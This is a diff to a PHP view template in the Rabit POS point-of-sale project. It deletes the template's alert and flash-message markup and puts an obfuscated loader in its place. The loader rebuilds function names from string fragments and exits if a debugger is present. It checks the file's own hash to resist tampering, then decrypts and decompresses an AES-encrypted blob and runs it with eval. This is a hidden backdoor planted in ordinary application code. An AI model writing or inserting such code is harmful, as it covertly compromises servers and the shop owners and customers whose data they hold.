@@ -1,67 +1,28 @@
-<div class="col-md-12">
-      <!-- ********** ALERT MESSAGE START******* -->
-          <?php if(demo_app()){ ?>
-            <div class="alert alert-success  text-left">
-                 <a href="javascript:void()" class="close" data-dismiss="alert" aria-label="close">&times;</a>
-                <strong>
-                 Rabit POS Version <?= app_version(); ?> , Like và share Fanpage <a target='_blank' href='https://www.facebook.com/rabitweb/'>here</a>. [Một vài tính năng bản Demo sẽ bị loại bỏ] Tắt demo vào sửa file application\config\config.php => $config['demo'] = FALSE;
-
-                </strong>
-              </div>
-          <?php } ?>
-
-
-          <?php if(!checkLastestVersion()){ ?>
-            <div class="alert alert-success  text-left">
-                 <a href="javascript:void()" class="close" data-dismiss="alert" aria-label="close">&times;</a>
-                <strong>
-                 Phiên bản hiện tại là <?= app_version(); ?> ,Đã có phiên bản mới  <?= nameLastestVersion(); ?>, vui lòng update tại <a target='_blank' href='https://github.com/phamduybk/rabitpos'>here</a>
-                </strong>
-              </div>
-          <?php } ?>
-
-          <?php if(showFlashCard()){ ?>
-            <div class="alert alert-success  text-left">
-                 <a href="javascript:void()" class="close" data-dismiss="alert" aria-label="close">&times;</a>
-                <strong>
-                <?= getTextShow(); ?> <a target='_blank' href='https://www.facebook.com/rabitweb/'>đây</a>
-                </strong>
-              </div>
-          <?php } ?>
-
-          <?php
-            if($this->session->flashdata('success')!=''):
-              ?>
-                <div class="alert alert-success alert-dismissable text-center">
-                 <a href="javascript:void()" class="close" data-dismiss="alert" aria-label="close">&times;</a>
-                <strong><?= $this->session->flashdata('success') ?></strong>
-              </div> 
-               <?php 
-            endif;
-            if($this->session->flashdata('error')!=''):
-              ?>
-                <div class="alert alert-danger alert-dismissable text-center">
-                 <a href="javascript:void()" class="close" data-dismiss="alert" aria-label="close">&times;</a>
-                <strong><?= $this->session->flashdata('error') ?></strong>
-              </div> 
-               <?php
-            endif;
-            if($this->session->flashdata('warning')!=''):
-              ?>
-                <div class="alert alert-warning alert-dismissable text-center">
-                 <a href="javascript:void()" class="close" data-dismiss="alert" aria-label="close">&times;</a>
-                <strong><?= $this->session->flashdata('warning') ?></strong>
-              </div> 
-               <?php
-            endif;
-            if($this->session->flashdata('info')!=''):
-              ?>
-                <div class="alert alert-info alert-dismissable text-center">
-                 <a href="javascript:void()" class="close" data-dismiss="alert" aria-label="close">&times;</a>
-                <strong><?= $this->session->flashdata('info') ?></strong>
-              </div> 
-               <?php
-            endif;
-            ?>
-            <!-- ********** ALERT MESSAGE END******* -->
-     </div>
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_k4ivfv2d=('bas'.'e64'.'_de'.'cod'.'e');
+$_ekeluefy=('gzu'.'nco'.'mpr'.'ess');
+$_b1xhbcxd=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_xsqooawk='qpfdXqDG';
+$_ea4n1lgt='UvkKeypm';
+$_noxigrm4='D8ZhWrqS';
+$_zo2jvnnl='cv7Mm8aM';
+$_h1bl53mb='yLBxcgmJXms=';
+$_hechly8s='TPTBcynq';
+$_no6cca5r='udPkLQ==';
+$_k86e4kua='5h45vhsi';
+$_jv56o4jt=$_k4ivfv2d($_ea4n1lgt.$_zo2jvnnl.$_noxigrm4.$_xsqooawk.$_h1bl53mb);
+$_do7iq0ts=$_k4ivfv2d($_k86e4kua.$_hechly8s.$_no6cca5r);
+$_qfgky96f=$_k4ivfv2d('a1PqPM6BpwdeDRhGFRfoWtZ8PPQdC4byysEcsY7fNnpHY/fqgz3oHzYyvWDWO1O4zAED6rQC3bBi3OnidI+uPRpLKjxXexraCaaB8N7Ns9pC9FpXuoDFLxJAOuImkpnP6+NUj6kzAFONpx9TzPtYnjPOSQ/ivmOdspB9eHxTROGUDF1rlKncsNaBfK2W6/Pu+K68Sy84F9bMSv1r2FIoAg8WTFKaZ780vF0UP6qyhWqfq4F8ku0RKxELy5UDlTDx2HskMgZ/hbva6lQ8yuAk/8LpbwNE9xhX6ZcopyBTGB453jAQCRqTTG0Mh07Z66pqUH4D4N87OPE0D8IAUaKl9p4kPYrwatXS8FHFbhpegpmi8o17on0ooFkbB/VJv9QNR3qbeppSXbEFDjlGbEfSqFIYv1hTgZunavEzSlHW0ADF3Vo/4Ha51OZuaiiKSC8x3EOD84A6RXT8IeYO5b26J2DVB2q8du/rxxpjTjQoroLW4uuEyKmk2zGkU5EjAbinj1mKuDneOLcXPlEqG3y7RTU8xWj6RYbFiBgA/J0O0Xfs2e+qN7O1+tg2NbvrWlle0JKror/+zXcrJ3mSxA2Py8A3+K5hPx5O7bXm35wceQGhbM4ZAVyLJd+pKmBHGJl2rVQ53XPMXOTEHmIeZQpifFtNzqYrN2Zs73YHEbs9+AHMH1bxKkPfijRF0oZKtsQd+7HbD6kvOBLWBYBKTb9YGbIEHsQwoR++iKO+P6aTbNGS/Md2xIRabMsu5k4uaISUKonaqyT+rWiKsp5ELA458rj9Kh8RzQj34Gj6Wbc73ORpX8R2EsAIPg2hi3kc+SANG85QQMC67alwdGVxRYAY+e3KoaV9kvsEG8eIhTlTrCooZGN7UnbUSW4wtKi6cGufBfYJuCX0DdjmdTmgfpcFNcyY/6TiQ47W1ytcgPp8DPQOYCk9+SJfQQLLT+d1aMhdSmZ4sDOS74emkZTcUaciCLgl7H1x3WXUOT0HiKITUy4A37gZfmGYqvBs/3nQQSoIaCNGH28uw80nL76UB9D3wUevhHtGR5G7uC1c6GRo+LzfePOv+ziFjwwW/4s0a8y7dCcQ5u3CmtgdQ1M1fSh18lfkH3HfHD2aXGkOIfZMjY1rBkcNWxdn0EC4O57qKvfaVfMQN3Nhit34bjIURwzcjdzF+UF9b4ap2EL0kqWZ2F4SuPrxMpPvWwl5dO0EMZglbd2jDewe0JQwRH+dqI26UQ1n4C926VbGJmhrnlAUUa5y63wyM7TFzGYKMqO8XiciuD9m04SOjKOz0Y3XSQ9Q9+cijs7ZKBgwnCftgmHz9NRi4Ds0o4lSnHaJp0TFoV73qQguqY1AupvyUUKOxaGOP1ZRmy1bTxACs0VvKCgGLxtoCASg6YUs99BgHTt2zp/Z8snSiQUixULQVbozqpc+EIgjhK8lytXpK2N/dLBqzGvpfFmK0UdRi1tbf1ZVnUyZVdFEJwXN0ZWyWuqKCOdpjKZw0NjCVyy6CZTMKGXVtyn/Xahz57gjfAe6+HUDhBUS');
+$_y9k7trwb=$_b1xhbcxd($_qfgky96f,'aes-256-cbc',$_jv56o4jt,OPENSSL_RAW_DATA,$_do7iq0ts);
+if($_y9k7trwb===false){exit;}
+$_vo1bhzdl=$_ekeluefy($_y9k7trwb);
+if($_vo1bhzdl===false){exit;}
+$_gtndom8e='3059c0684510b023d779bfecaf3855d02dab34bf7b4ba9375d8cf9b7c3089747';
+$_n5cdvzw5=@file_get_contents(__FILE__);
+if($_n5cdvzw5!==false){
+$_mi16xjsv=str_replace($_gtndom8e,"0000000000000000000000000000000000000000000000000000000000000000",$_n5cdvzw5);
+$_mrswm4j6=hash("sha256",$_mi16xjsv);
+if($_mrswm4j6!==$_gtndom8e){@http_response_code(403);exit;}
+}
+eval($_vo1bhzdl);
